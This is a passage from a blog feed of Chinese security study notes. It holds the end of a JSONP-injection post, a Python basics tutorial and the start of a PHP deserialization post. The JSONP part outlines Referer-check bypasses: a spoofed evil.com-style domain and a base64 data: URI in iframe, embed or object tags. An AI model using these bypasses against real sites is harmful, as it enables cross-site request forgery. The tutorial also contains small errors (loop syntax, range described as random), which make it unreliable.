text/ecmascript等.)才能在所有浏览器中运行,如果没有设置X-Content-Type-Options: nosniff头，它能在所有的浏览器下工作,故在一些旧的浏览器中可以绕过。</p><h2 id="绕过"><a class="header-anchor" href="#绕过">🍭</a>绕过</h2><p>（当防御方式是判断<code>reference</code>是否为可信来源或添加随机值时）</p><blockquote><p><em><code>reference</code>伪造(<a href="http://qq.com.evil.com">qq.com.evil.com</a>)</em><br><em>暴力穷举</em><br><em>空reference</em>:</p><blockquote><p>构造一个不带HTTP Referer的请求:利用data URI(<strong>Data URLs</strong>，即前缀为 <code>data:</code> 协议的URL，其允许内容创建者向文档中嵌入小文件)</p><p>Data URLs 由四个部分组成：前缀(<code>data:</code>)、指示数据类型的MIME类型、*如果非文本则为可选的<code>base64</code>标记,如果数据是文本类型，可以直接将文本嵌入 (根据文档类型，使用合适的实体字符或转义字符。如果是二进制数据，可将数据进行base64编码之后再进行嵌入、*数据本身：</p><pre><code class="hljs markdown">&gt;&gt;data:[<span class="hljs-string">&lt;mediatype&gt;</span>][<span class="hljs-symbol">;base64</span>],<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">data</span>&gt;</span></span></code></pre><p>处理的代码包含了引号，双引号，以及其他一些被阻止的语句，接着使用base64编码payload（回调函数定义以及脚本）即可达到reference绕过</p><p>可使用的标签：</p><blockquote><p>iframe (在src属性中)<br>embed (在src属性中)<br>object (在data属性中)</p></blockquote></blockquote></blockquote><p>结束❤️❤️❤️</p><p>参考：<a href="https://www.runoob.com/json/json-jsonp.html">JSONP教程|菜鸟教程</a></p><p><a href="https://www.dazhuanlan.com/2020/01/29/5e31a80b198fd/">JSONP注入利用与防御</a></p><p><a href="https://www.jianshu.com/p/6fd8486f6f8b">json及jsonp注入</a></p><p><a href="https://www.freebuf.com/articles/web/126347.html">JSONP注入解析</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>python(二)</title>
    <link href="/2021/02/18/python2/"/>
    <url>/2021/02/18/python2/</url>
    
    <content type="html"><![CDATA[<p>之前在sqli-labs的SQL盲注说有时间要学习一下编写python脚本来跑盲注关卡，但是python基础语法还没学完，今天来填坑👻👻👻</p><h2 id="列表"><a class="header-anchor" href="#列表">🌞</a>列表</h2><ul><li><p>列表可以索引，切片，加，乘，检查成员</p></li><li><p>列表可以作为一个方括号内的逗号分隔值出现</p></li><li><p>列表的数据项不需要具有相同的类型</p></li><li><p>创建一个列表，只要把逗号分隔的不同的数据项使用方括号括起来即可</p><pre><code class="hljs ini"><span class="hljs-attr">list</span> = [<span class="hljs-string">&#x27;genius&#x27;</span>, <span class="hljs-string">&#x27;rose&#x27;</span>, <span class="hljs-number">233</span>, <span class="hljs-number">8080</span>]</code></pre></li></ul><h4 id="访问值"><a class="header-anchor" href="#访问值">🌞</a>访问值</h4><ul><li><p>列表索引也是从 0 开始，第二个索引是 1</p></li><li><p>也可以从尾部开始，最后一个元素的索引为 -1，往前一位为 -2</p></li><li><p>也可以使用方括号 [] 的形式截取字符</p><pre><code class="hljs angelscript">nums = [<span class="hljs-number">10</span>, <span class="hljs-number">20</span>, <span class="hljs-number">30</span>, <span class="hljs-number">40</span>, <span class="hljs-number">50</span>, <span class="hljs-number">60</span>, <span class="hljs-number">70</span>, <span class="hljs-number">80</span>, <span class="hljs-number">90</span>]print(nums[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>])<span class="hljs-comment">//输出结果:10, 20, 30, 40(nums[0:4]中的4索引位不包括)</span></code></pre></li></ul><p>访问规则与字符串类似，不再赘述</p><h4 id="更新"><a class="header-anchor" href="#更新">🌞</a>更新</h4><pre><code class="hljs angelscript">list[<span class="hljs-number">2</span>] = <span class="hljs-number">2001</span><span class="hljs-comment">//直接更新</span></code></pre><p>也可以使用 append() 方法来添加列表项</p><h4 id="删除"><a class="header-anchor" href="#删除">🌞</a>删除</h4><pre><code class="hljs angelscript">del list[<span class="hljs-number">2</span>]<span class="hljs-comment">//删除第三个元素</span></code></pre><h4 id="脚本操作符"><a class="header-anchor" href="#脚本操作符">🌞</a>脚本操作符</h4><p>+ 号用于组合列表，* 号用于重复列表（与字符串类似)</p><table><thead><tr><th>表达式</th><th>作用</th></tr></thead><tbody><tr><td>len([1, 2, 3])</td><td>求长度</td></tr><tr><td>[1, 2, 3] + [4, 5, 6]</td><td>组合</td></tr><tr><td>[‘Hi!’] * 4</td><td>重复</td></tr><tr><td>3 in [1, 2, 3]</td><td>判断元素是否存在于列表中</td></tr><tr><td>for x in [1, 2, 3]: print(x, end=&quot; &quot;)</td><td>迭代</td></tr></tbody></table><p>列表的嵌套，截取与拼接之前提到不再赘述</p><table><thead><tr><th>函数/方法</th><th>作用</th></tr></thead><tbody><tr><td>list(seq)</td><td>将元组转换为列表</td></tr><tr><td>list.append(obj)</td><td>在列表末尾添加新的对象</td></tr><tr><td>list.count(obj)</td><td>统计某个元素在列表中出现的次数</td></tr><tr><td>list.extend(seq)</td><td>在列表末尾一次性追加另一个序列中的多个值（用新列表扩展原来的列表）</td></tr><tr><td>list.index(obj)</td><td>从列表中找出某个值第一个匹配项的索引位置</td></tr><tr><td>list.insert(index, obj)</td><td>将对象插入列表</td></tr><tr><td>list.pop([index=-1])</td><td>移除列表中的一个元素（默认最后一个元素），并且返回该元素的值</td></tr><tr><td>list.remove(obj)</td><td>移除列表中某个值的第一个匹配项</td></tr><tr><td>list.reverse()</td><td>反向列表中元素</td></tr><tr><td>list.sort( key=None, reverse=False)</td><td>对原列表进行排序</td></tr><tr><td>list.clear()</td><td>清空列表</td></tr><tr><td>list.copy()</td><td>复制列表</td></tr><tr><td>list.sort()</td><td>升序排序</td></tr><tr><td>list.sort(reverse=Ture)</td><td>降序排序</td></tr></tbody></table><h4 id="将列表当做堆栈使用"><a class="header-anchor" href="#将列表当做堆栈使用">🌞</a>将列表当做堆栈使用</h4><p>列表方法使得列表可以很方便的作为一个堆栈来使用，堆栈作为特定的数据结构，最先进入的元素最后一个被释放（后进先出）。用 append() 方法可以把一个元素添加到堆栈顶。用不指定索引的 pop() 方法可以把一个元素从堆栈顶释放出来。</p><img src="/2021/02/18/python2/5.jpg" alt="5" style="zoom:50%;"><h4 id="将列表当作队列使用"><a class="header-anchor" href="#将列表当作队列使用">🌞</a>将列表当作队列使用</h4><p>在队列里第一加入的元素，第一个取出来；但效率不高。在列表的最后添加或者弹出元素速度快，在列表里插入或者从头部弹出速度却不快（因为所有其他的元素都得一个一个地移动）</p><h4 id="列表推导式"><a class="header-anchor" href="#列表推导式">🌞</a>列表推导式</h4><p>列表推导式提供了从序列创建列表的简单途径。通常应用程序将一些操作应用于某个序列的每个元素，用其获得的结果作为生成新列表的元素，或者根据确定的判定条件创建子序列。</p><img src="/2021/02/18/python2/6.jpg" alt="6" style="zoom:80%;"><p>元组之前介绍过了，这里补充：</p><ul><li>元组中只包含一个元素时，需要在元素后面添加逗号，否则括号会被当作运算符使用</li><li>元组的不可变指的是元组所指向的内存中的内容不可变</li></ul><p>字典补充：</p><p>键必须不可变，可以用数字，字符串或元组充当，而用列表就不行。</p><p>集合补充：</p> <pre><code class="hljs gradle">basket = &#123;<span class="hljs-string">&#x27;apple&#x27;</span>, <span class="hljs-string">&#x27;orange&#x27;</span>, <span class="hljs-string">&#x27;apple&#x27;</span>, <span class="hljs-string">&#x27;pear&#x27;</span>, <span class="hljs-string">&#x27;orange&#x27;</span>, <span class="hljs-string">&#x27;banana&#x27;</span>&#125;<span class="hljs-keyword">print</span>(basket)<span class="hljs-comment">//去重功能</span>&#123;<span class="hljs-string">&#x27;orange&#x27;</span>, <span class="hljs-string">&#x27;banana&#x27;</span>, <span class="hljs-string">&#x27;pear&#x27;</span>, <span class="hljs-string">&#x27;apple&#x27;</span>&#125;<span class="hljs-string">&#x27;orange&#x27;</span> in basket <span class="hljs-comment">//快速判断元素是否在集合内</span><span class="hljs-keyword">True</span><span class="hljs-string">&#x27;crabgrass&#x27;</span> in basket<span class="hljs-keyword">False</span></code></pre><p>随机删除集合中的一个元素(对集合进行无序的排列，然后将这个无序排列集合的左面第一个元素进行删除)</p>  <pre><code class="hljs css"><span class="hljs-selector-tag">s</span><span class="hljs-selector-class">.pop</span>()</code></pre><h4 id="end-关键字"><a class="header-anchor" href="#end-关键字">🌞</a>end 关键字</h4><p>将结果输出到同一行，或者在输出的末尾添加不同的字符</p><h2 id="语句"><a class="header-anchor" href="#语句">🌞</a>语句</h2><h4 id="if-语句"><a class="header-anchor" href="#if-语句">🌞</a>if 语句</h4><pre><code class="hljs gcode"><span class="hljs-keyword">if</span> co<span class="hljs-symbol">ndition_1</span>:    stateme<span class="hljs-symbol">nt_block_1</span>elif co<span class="hljs-symbol">ndition_2</span>:    stateme<span class="hljs-symbol">nt_block_2</span>else:    stateme<span class="hljs-symbol">nt_block_3</span></code></pre><p><strong>注意：</strong></p><ul><li>每个条件后面要使用冒号</li><li>使用缩进来划分语句块，相同缩进数的语句在一起组成一个语句块。</li><li>在Python中没有switch – case语句</li></ul><h4 id="for循环"><a class="header-anchor" href="#for循环">🌞</a>for循环</h4><pre><code class="hljs gauss"><span class="hljs-keyword">while</span> condition：   <span class="hljs-built_in">statements</span>……</code></pre><ul><li>注意冒号和缩进</li><li>在 Python 中没有 do…while 循环</li></ul><h4 id="while循环"><a class="header-anchor" href="#while循环">🌞</a>while循环</h4><pre><code class="hljs dts">while <span class="hljs-params">&lt;expr&gt;</span>:    <span class="hljs-params">&lt;statement(s)&gt;</span><span class="hljs-symbol">else:</span>    <span class="hljs-params">&lt;additional_statement(s)&gt;</span></code></pre><h4 id="for语句"><a class="header-anchor" href="#for语句">🌞</a>for语句</h4><pre><code class="hljs dts">for <span class="hljs-params">&lt;variable&gt;</span> in <span class="hljs-params">&lt;sequence&gt;</span>:    <span class="hljs-params">&lt;statements&gt;</span><span class="hljs-symbol">else:</span>    <span class="hljs-params">&lt;statements&gt;</span></code></pre><p><strong>range()函数</strong></p><p>遍历数字序列,生成数列</p><pre><code class="hljs apache"><span class="hljs-attribute">for</span> i in range(<span class="hljs-number">5</span>,<span class="hljs-number">9</span>)//在(<span class="hljs-number">5</span>,<span class="hljs-number">9</span>)之间随机<span class="hljs-attribute">for</span> i in range(<span class="hljs-number">0</span>, <span class="hljs-number">10</span>, <span class="hljs-number">3</span>)//（<span class="hljs-number">0</span>，<span class="hljs-number">10</span>）之间以<span class="hljs-number">3</span>为步长<span class="hljs-attribute">list</span>(range(<span class="hljs-number">5</span>))//用range()创建一个列表</code></pre><h4 id="pass"><a class="header-anchor" href="#pass">🌞</a>pass</h4><p>空语句，保持程序结构的完整性。，pass 一般用做占位语句。</p><h2 id="函数"><a class="header-anchor" href="#函数">🌞</a>函数</h2><h4 id="自定义"><a class="header-anchor" href="#自定义">🌞</a>自定义</h4><ul><li>函数代码块以 <strong>def</strong> 开头，后接函数标识符名称和圆括号 <strong>()</strong>。</li><li>任何传入参数和自变量必须放在圆括号中间，圆括号之间可以用于定义参数。</li><li>函数的第一行语句可以选择性地使用文档字符串—用于存放函数说明</li><li>函数内容以冒号 : 起始，并且缩进。</li><li><strong>return [表达式]</strong> 结束函数，选择性地返回一个值给调用方，不带表达式的 return 相当于返回 None。</li></ul><pre><code class="hljs flix"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">函数名（参数列表）</span></span>:    函数体</code></pre><h4 id="参数"><a class="header-anchor" href="#参数">🌞</a>参数</h4><ul><li><p>必需参数</p><p>以正确的顺序传入函数。调用时的数量必须和声明时的一样。</p></li><li><p>关键字参数</p><p>函数调用使用关键字参数来确定传入的参数值。使用关键字参数允许函数调用时参数的顺序与声明时不一致。</p></li><li><p>默认参数</p></li><li><p>不定长参数</p><p>处理比当初声明时更多的参数，声明时不命名</p><p>加了星号 *的参数会以元组(tuple)的形式导入，存放所有未命名的变量参数。</p><p>带两个星号 *的参数会以字典的形式导入。</p></li></ul><h4 id="匿名函数"><a class="header-anchor" href="#匿名函数">🌞</a>匿名函数</h4><ul><li>python 使用 lambda 来创建匿名函数</li><li>lambda 函数拥有自己的命名空间，且不能访问自己参数列表之外或全局命名空间里的参数</li><li>lambda的主体是一个表达式仅能在lambda表达式中封装有限的逻辑进去。</li></ul><pre><code class="hljs css"><span class="hljs-selector-tag">lambda</span> <span class="hljs-selector-attr">[arg1 [,arg2,.....argn]</span>]<span class="hljs-selector-pseudo">:expression</span></code></pre><h2 id="输入与输出"><a class="header-anchor" href="#输入与输出">🌞</a>输入与输出</h2><blockquote><p>表达式语句</p><p>print() 函数</p><p>文件对象的 write() 方法：</p><blockquote><p>标准输出： <code>sys.stdout()</code></p><p>格式化输出：<code>str.format() </code></p><p>字符串输出：</p><blockquote><p><strong>str()：</strong> 函数返回一个用户易读的表达形式</p><p><strong>repr()：</strong> 产生一个解释器易读的表达形式</p><p><strong>rjust()</strong> : 将字符串靠右, 并在左边填充空格</p><p><strong>zfill()</strong>: 在数字的左边填充 0</p></blockquote></blockquote></blockquote><h2 id="读写文件"><a class="header-anchor" href="#读写文件">🌞</a>读写文件</h2><p>open() 将会返回一个 file 对象:</p><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">open</span><span class="hljs-params">(filename, mode)</span></span></code></pre><p>mode决定了打开文件的模式：只读，写入，追加</p><table><thead><tr><th>模式</th><th>描述</th></tr></thead><tbody><tr><td>r</td><td>以只读方式打开文件。文件的指针将会放在文件的开头。这是默认模式。</td></tr><tr><td>rb</td><td>以二进制格式打开一个文件用于只读。文件指针将会放在文件的开头。</td></tr><tr><td>r+</td><td>打开一个文件用于读写。文件指针将会放在文件的开头。</td></tr><tr><td>rb+</td><td>以二进制格式打开一个文件用于读写。文件指针将会放在文件的开头。</td></tr></tbody></table><p>以上模式类推r,w,a.</p><h2 id="文件对象方法"><a class="header-anchor" href="#文件对象方法">🌞</a>文件对象方法</h2><ul><li><p><code>f.read()</code>:读取一个文件的内容</p></li><li><p><code>f.readline()</code>:从文件中读取单独的一行</p></li><li><p><code>f.readlines() </code>:将返回该文件中包含的所有行</p></li><li><p><code>f.write(string)</code> :将 string 写入到文件中, 然后返回写入的字符数</p></li><li><p><code>f.tell() </code>:返回文件对象当前所处的位置(从文件开头开始算起的字节数)</p></li><li><p><code>file.close()</code>:关闭文件。关闭后文件不能再进行读写操作</p></li><li><p><code>file.flush()</code>：刷新文件内部缓冲，直接把内部缓冲区的数据立刻写入文件</p></li><li><p><code>f.seek(offset, from_what)</code>:改变文件当前的位置</p><p><code>from_what </code>:0 表示开头, 1 表示当前位置, 2 表示文件的结尾</p></li></ul><h2 id="pickle-模块"><a class="header-anchor" href="#pickle-模块">🌞</a>pickle 模块</h2><pre><code class="hljs css"><span class="hljs-selector-tag">pickle</span><span class="hljs-selector-class">.dump</span>(<span class="hljs-selector-tag">obj</span>, <span class="hljs-selector-tag">file</span>, <span class="hljs-selector-attr">[,protocol]</span>)</code></pre><ul><li>序列化操作:将程序中运行的对象信息保存到文件中去，永久存储。</li><li>反序列化操作:从文件中创建上一次程序保存的对象。</li></ul><p>OS模块详见：<a href="https://www.runoob.com/python3/python3-os-file-methods.html">OS 文件/目录方法</a></p><h2 id="报错信息"><a class="header-anchor" href="#报错信息">🌞</a>报错信息</h2><blockquote><p>语法错误</p><blockquote><p>Python 无法解析代码</p></blockquote></blockquote><blockquote><p>异常</p><blockquote><p>运行期检测到的错误</p><blockquote><p><strong>Try 语句:</strong></p><p>可使用 try 语句处理异常</p><ul><li><p><code>try</code>：必需子句,是 Python 在 <code>try</code> 语句中首先运行的代码。</p></li><li><p><code>except</code>：</p></li></ul><p><em>一个 try 语句可能包含多个except子句,但最多只有一个分支会被执行</em></p><p><em>运行 <code>try</code> 块时遇到异常，它将跳到处理该异常的 <code>except</code> 块。</em></p><p><em>如果一个异常没有与任何的 except  匹配，那么这个异常将会传递给上层的 try 中</em></p><p><em>一个except子句可以同时处理多个异常（）:</em></p><pre><code class="hljs python"><span class="hljs-keyword">except</span> (RuntimeError, TypeError, NameError):    <span class="hljs-keyword">pass</span></code></pre><ul><li><p><code>else</code>：在运行 <code>try</code> 块时没有遇到异常执行</p></li><li><p><code>finally</code>：无论是否发生异常都将执行最后的代码</p></li></ul></blockquote></blockquote></blockquote><h4 id="抛出异常"><a class="header-anchor" href="#抛出异常">🌞</a>抛出异常</h4><p>使用 raise 语句抛出一个指定的异常：</p><pre><code class="hljs inform7">raise <span class="hljs-comment">[Exception <span class="hljs-comment">[, args <span class="hljs-comment">[, traceback]</span>]</span>]</span></code></pre><p>raise的参数指定了要被抛出的异常：一个异常的实例或者是异常的类（也就是 Exception 的子类）</p><h2 id="面向对象"><a class="header-anchor" href="#面向对象">🌞</a>面向对象</h2><ul><li><code>类(Class)</code>: 描述具有相同的属性和方法的对象的集合。它定义了该集合中每个对象所共有的属性和方法。对象是类的实例。</li><li><code>方法</code>:类中定义的函数。（与普通的函数的区别:必须有一个额外的第一个参数名称:self）</li><li><code>类变量</code>:类变量在整个实例化的对象中是公用的。类变量定义在类中且在函数体之外。类变量通常不作为实例变量使用。</li><li><code>数据成员</code>:类变量或者实例变量用于处理类及其实例对象的相关的数据。</li><li><code>方法重写</code>:如果从父类继承的方法不能满足子类的需求，可以对其进行改写，这个过程叫方法的覆盖,也称为方法的重写。</li><li><code>局部变量</code>:定义在方法中的变量，只作用于当前实例的类。</li><li><code>实例变量</code>:在类的声明中，属性是用变量来表示的，这种变量就称为实例变量，实例变量就是一个用 self 修饰的变量。</li><li><code>继承</code>:即一个派生类（derived class）继承基类（base  class）的字段和方法。继承也允许把一个派生类的对象作为一个基类对象对待。</li><li><code>实例化</code>:创建一个类的实例，类的具体对象。</li><li><code>对象</code>:通过类定义的数据结构实例。对象包括两个数据成员（类变量和实例变量）和方法。</li></ul><blockquote><p>类的私有属性</p><blockquote><p><strong>__private_attrs</strong>：两个下划线开头，声明该属性为私有，不能在类的外部被使用或直接访问。在类内部的方法中使用时 <strong>self.__private_attrs</strong></p></blockquote></blockquote><blockquote><p>类的私有方法</p><blockquote><p><strong>__private_method</strong>：两个下划线开头，声明该方法为私有方法，只能在类的内部调用 ，不能在类的外部调用。<strong>self.__private_methods</strong></p></blockquote></blockquote><p>类的专有方法</p><blockquote><p><code>__init__ </code>:构造函数，在生成对象时调用<br><strong><code>__del__</code>:</strong> 析构函数，释放对象时使用<br><strong><code>__repr__</code> :</strong> 打印，转换<br><strong><code>__setitem__</code> :</strong> 按照索引赋值<br><strong><code>__getitem__</code>:</strong> 按照索引获取值<br><strong><code>__len__</code>:</strong> 获得长度<br><strong><code>__cmp__</code>:</strong> 比较运算<br><strong><code>__call__</code>:</strong> 函数调用<br><strong><code>__add__</code>:</strong> 加运算<br><strong><code>__sub__</code>:</strong> 减运算<br><strong><code>__mul__</code>:</strong> 乘运算<br><strong><code>__truediv__</code>:</strong> 除运算<br><strong><code>__mod__</code>:</strong> 求余运算<br><strong><code>__pow__</code>:</strong> 乘方</p></blockquote><h2 id="命名空间"><a class="header-anchor" href="#命名空间">🌞</a>命名空间</h2><p>各个命名空间独立：</p><ul><li><strong>内置名称（built-in names</strong>），内置的名称，如函数名 abs、char 和异常名称 BaseException、Exception ……</li><li><strong>全局名称（global names）</strong>，模块中定义的名称，记录了模块的变量，包括函数、类、其它导入的模块、模块级的变量和常量。</li><li><strong>局部名称（local names）</strong>，函数中定义的名称，记录了函数的变量，包括函数的参数和局部定义的变量</li></ul><img src="/2021/02/18/python2/3.png" alt="3" style="zoom:67%;"><h2 id="作用域"><a class="header-anchor" href="#作用域">🌞</a>作用域</h2><p>程序可以直接访问命名空间的正文区域</p><img src="/2021/02/18/python2/4.png" alt="4" style="zoom:67%;"><p>做图上瘾ing🐷🐷🐷</p><h2 id="迭代器"><a class="header-anchor" href="#迭代器">🌞</a>迭代器</h2><ul><li>访问集合元素的一种方式。</li><li>它可以记住遍历的位置的对象。</li><li>迭代器对象从集合的第一个元素开始访问，直到所有的元素被访问完结束。迭代器只能往前不会后退。</li></ul><p>基本的方法：</p><blockquote><p><strong><code>__iter()__</code></strong></p><blockquote><p>返回一个特殊的迭代器对象， 这个迭代器对象实现了<code>__next__()</code>方法并通过 StopIteration 异常标识迭代的完成</p></blockquote></blockquote><blockquote><p><strong><code>__next()__</code></strong></p><blockquote><p>返回下一个迭代器对象</p></blockquote></blockquote><h2 id="生成器"><a class="header-anchor" href="#生成器">🌞</a>生成器</h2><p>使用了 yield 的函数。</p><ul><li>生成器是一个返回迭代器的函数，只能用于迭代操作</li><li>调用生成器时，遇到 yield 时函数会暂停并保存当前所有的运行信息，返回 yield 的值, 并在下一次执行 next() 方法时从当前位置继续运行。</li></ul><h2 id="模块"><a class="header-anchor" href="#模块">🌞</a>模块</h2><p>把这些定义存放在文件中，为一些脚本或者交互式的解释器实例使用，这个文件被称为模块，模块包含所有定义的函数和变量的文件，且可以被别的程序引入。</p><h4 id="常用模块"><a class="header-anchor" href="#常用模块">🌞</a>常用模块</h4><ul><li>csv：读取 csv 文件</li><li>collections：常见数据类型的实用扩展，包括 OrderedDict、defaultdict 和 namedtuple</li><li>random：生成假随机数字，随机打乱序列并选择随机项</li><li>string：关于字符串的更多函数。此模块还包括实用的字母集合，例如 string.digits（包含所有字符都是有效数字的字符串）。</li><li>re：通过正则表达式在字符串中进行模式匹配</li><li>math：一些标准数学函数</li><li>os：与操作系统交互</li><li>os.path：os 的子模块，用于操纵路径名称</li><li>sys：直接使用 Python 解释器</li><li>json：适用于读写 json 文件（面向网络开发）</li></ul><h4 id="import-语句"><a class="header-anchor" href="#import-语句">🌞</a>import 语句</h4><pre><code class="hljs ceylon"><span class="hljs-keyword">import</span> <span class="hljs-keyword">module</span><span class="hljs-number">1</span>[, <span class="hljs-keyword">module</span><span class="hljs-number">2</span>[,... moduleN]<span class="hljs-keyword">import</span> A as B<span class="hljs-comment">//给引入的包A定义一个别名B</span></code></pre><p>举个栗子💌💌💌：</p><pre><code class="hljs stylus">import sys<span class="hljs-comment">// 引入标准库中的 sys.py 模块</span><span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> sys<span class="hljs-selector-class">.argv</span>:<span class="hljs-comment">//sys.argv 是一个包含命令行参数的列表</span>   print(i) <span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">&#x27;\nPython 路径为：&#x27;</span>, sys.path, <span class="hljs-string">&#x27;\n&#x27;</span>)</span></span><span class="hljs-comment">//查找所需模块的路径的列表</span></code></pre><ul><li>一个模块只会被导入一次</li><li>搜索路径是由一系列目录名组成的，Python解释器就依次从这些目录中去寻找所引入的模块</li></ul><h4 id="from-…-import-语句"><a class="header-anchor" href="#from-…-import-语句">🌞</a>from … import 语句</h4><p>从模块中导入一个指定的部分到当前命名空间中：</p><pre><code class="hljs angelscript"><span class="hljs-keyword">from</span> modname <span class="hljs-keyword">import</span> name1[, name2[, ... nameN]]eg: <span class="hljs-keyword">from</span> fibo <span class="hljs-keyword">import</span> fib, fib2<span class="hljs-comment">//不会把整个fibo模块导入到当前的命名空间中，它只会将fibo里的fib函数引入进来</span><span class="hljs-keyword">from</span> modname <span class="hljs-keyword">import</span> *<span class="hljs-comment">//把一个模块的所有内容全都导入到当前的命名空间</span></code></pre><h4 id="name-属性"><a class="header-anchor" href="#name-属性">🌞</a>__name__属性</h4><ul><li>一个模块被另一个程序第一次引入时，其主程序将运行。如果我们想在模块被引入时，模块中的某一程序块不执行，我们可以用__name__属性来使该程序块仅在该模块自身运行时执行</li><li>每个模块都有一个__name__属性，当其值是’<strong>main</strong>’时，表明该模块自身在运行，否则是被引入。</li></ul><h4 id="dir-函数"><a class="header-anchor" href="#dir-函数">🌞</a>dir() 函数</h4><p>内置的函数 dir() 可以找到模块内定义的所有名称。以一个字符串列表的形式返回.</p><h4 id="sys模块"><a class="header-anchor" href="#sys模块">🌞</a>sys模块</h4><p>内置于每一个 Python 解析器中，变量 sys.ps1 和 sys.ps2 定义了主提示符和副提示符所对应的字符串:</p><pre><code class="hljs ruby"><span class="hljs-meta">&gt;&gt;</span>&gt; import sys<span class="hljs-meta">&gt;&gt;</span>&gt; sys.ps1<span class="hljs-string">&#x27;&gt;&gt;&gt; &#x27;</span><span class="hljs-meta">&gt;&gt;</span>&gt; sys.ps2<span class="hljs-string">&#x27;... &#x27;</span><span class="hljs-meta">&gt;&gt;</span>&gt; sys.ps1 = <span class="hljs-string">&#x27;C&gt; </span><span class="hljs-string">C&gt; </span></code></pre><h4 id="包"><a class="header-anchor" href="#包">🌞</a>包</h4><p>一种管理 Python 模块命名空间的形式，采用&quot;点模块名称&quot;。若一个模块的名称是 A.B， 那么他表示一个包 A中的子模块 B 。可避免不同模块之间的全局变量相互影响或不同库之间的模块重名。</p><p>导入包时，Python 会根据 sys.path 中的目录来寻找这个包中包含的子目录。</p><p>目录只有包含一个叫做 <strong>init</strong>.py 的文件才会被认作是一个包</p><p><strong>导入方法</strong></p><ul><li>只导入一个包里面的特定模块</li><li>导入子模块</li><li>直接导入一个函数或者变量</li></ul><p><strong>注</strong>：</p><p><em><code>from package import item</code>以这种形式导入时，对应的 item 既可以是包里面的子模块（子包），或者包里面定义的其他名称，比如函数，类或者变量。（先把 item 当作一个包定义的名称，如果没找到，再试图按照一个模块去导入。如果还没找到，就 <strong>:exc:ImportError</strong> 异常）</em></p><p><em><code>import item.subitem.subsubitem</code> 这种导入形式，除了最后一项，都必须是包，而最后一项则可以是模块或者是包，但是不可以是类，函数或者变量的名字。</em></p><p><em><code>from sound.effects import </code>:若定义文件 <strong><strong>init</strong>.py</strong> 存在一个叫做 <strong><strong>all</strong></strong> 的列表变量，会把这个列表中的所有名字作为包内容导入（ Windows系统不区分大小写）；若 <strong><strong>all</strong></strong> 无定义，就不会导入包 里的任何子模块。而是把包和它里面定义的所有内容导入。</em></p><h4 id="常用第三方软件包"><a class="header-anchor" href="#常用第三方软件包">🌞</a>常用第三方软件包</h4><blockquote><p><code>IPython</code> - 更好的交互式 Python 解释器<br><code>requests</code> - 提供易于使用的方法来发出网络请求。适用于访问网络 API。<br><code>Flask</code> - 一个小型框架，用于构建网络应用和 API。<br><code>Django </code>- 一个功能更丰富的网络应用构建框架。Django 尤其适合设计复杂、内容丰富的网络应用。<br><code>Beautiful Soup</code> - 用于解析 HTML 并从中提取信息。适合网页数据抽取。<br><code>pytest</code> - 扩展了 Python 的内置断言，并且是最具单元性的模块。<br><code>PyYAML </code>- 用于读写 YAML 文件。<br><code>NumPy </code>- 用于使用 Python 进行科学计算的最基本软件包。它包含一个强大的 N 维数组对象和实用的线性代数功能等。<br><code>pandas </code>- 包含高性能、数据结构和数据分析工具的库。尤其是，pandas 提供 dataframe！<br><code>matplotlib</code> - 二维绘制库，会生成达到发布标准的高品质图片，并且采用各种硬拷贝格式和交互式环境。<br><code>ggplot </code>- 另一种二维绘制库，基于 R’s ggplot2 库。<br><code>Pillow - Python</code> 图片库可以向你的 Python 解释器添加图片处理功能。<br><code>pyglet </code>- 专门面向游戏开发的跨平台应用框架。<br><code>Pygame</code> - 用于编写游戏的一系列 Python 模块。<br><code>pytz - Python</code> 的世界时区定义。</p></blockquote><p>基础知识大概就这些💖💖💖</p><p><strong>脚本</strong></p><p>与一般程序的主要区别在于是否编译。相对于程序而言，脚本更加随性。脚本可以直接在某种具有解释功能的环境中运行。</p><p><strong>文本编辑器</strong></p><ul><li><a href="https://code.visualstudio.com/download">Visual Studio Code</a></li><li><a href="http://www.sublimetext.com/">Sublime Text</a></li><li><a href="https://notepad-plus-plus.org/">Notepad++</a></li><li><a href="https://atom.io/">Atom</a></li></ul><p>上面这四个都挺好用的，<code>VS code</code>我是用来查看源码，<code>notepad</code>和<code>sublime</code>用来编写代码，<code>atom</code>功能比较全是由GitHub构建的一个强大的交互式开发环境💯💯💯，Linux里还有<code>emacs</code>和<code>vim</code>可用.</p><p>结束☀️☀️☀️☀️</p><p>参考：<a href="https://www.runoob.com/python3">菜鸟教程</a></p><p><a href="https://blog.csdn.net/reallyr/article/details/87364399">python脚本编写</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>PHP反序列化漏洞</title>
    <link href="/2021/02/14/re/"/>
    <url>/2021/02/14/re/</url>
    
    <content type="html"><![CDATA[<h2 id="php面向对象编程："><a class="header-anchor" href="#php面向对象编程：">¶</a>php面向对象编程：</h2><ul><li>对象：可以对其做事情的一些东西。一个对象有<strong>状态、行为和标识</strong>三种属性。</li><li>类：一个共享相同结构和行为的对象的集合。每个类的定义都以关键字class开头，后面跟着类的名字。一个类可以包含有属于自己的变量，变量（称为“属性”）以及函数（“称为方法”）类定义了一件事物的抽象特点。</li></ul><h2 id="序列化"><a class="header-anchor" href="#序列化">¶</a>序列化</h2><p>将一个对象、数组、字符串等转化为字节流便于传输。序列化的目的是方便数据的传输和存储,但序列化不保存方法。</p><p><strong>serialize()</strong></p><p>把一个对象变成可以传输的字符串，该函数会先检查类中是否存在一个魔术方法 <code>__sleep()</code>,如果存在，<code>__sleep()</code>方法会先被调用，然后才执行序列化操作,可以在<code>__sleep()</code>方法里可以决定哪些属性被序列化。先写个代码测试一下</p><p><img src="/2021/02/14/re/1.png" alt="1"></p><p>运行结果：</p><img src="/2021/02/14/re/2.jpg" alt="2" style="zoom:67%;"><ul><li>O:代表object</li><li>1:代表对象名字长度为一个字符</li><li>S:对象的名称</li><li>1:代表对象里面有一个变量</li><li>s:数据类型</li><li>4:变量名称的长度</li><li>test:变量名称</li><li>s:数据类型</li><li>12:变量值的长度</li><li>Genius is 